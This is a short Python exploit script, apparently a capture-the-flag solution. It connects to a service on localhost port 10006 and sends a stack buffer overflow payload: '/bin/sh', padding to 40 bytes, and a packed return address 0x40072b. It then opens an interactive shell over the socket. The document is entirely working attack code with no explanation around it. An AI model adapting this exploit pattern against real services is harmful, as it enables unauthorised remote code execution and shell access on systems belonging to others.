import struct
import socket
import telnetlib


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("localhost",10006))


print(s.recv(1024))
print(s.recv(1024))
print(s.recv(1024))
buf = "/bin/sh\0"
buf += 'A' * (40 - len(buf))
buf += struct.pack("<Q",0x40072b)
buf += "\n"
s.send(buf)


print(buf)

t = telnetlib.Telnet()
t.sock = s
t.interact()
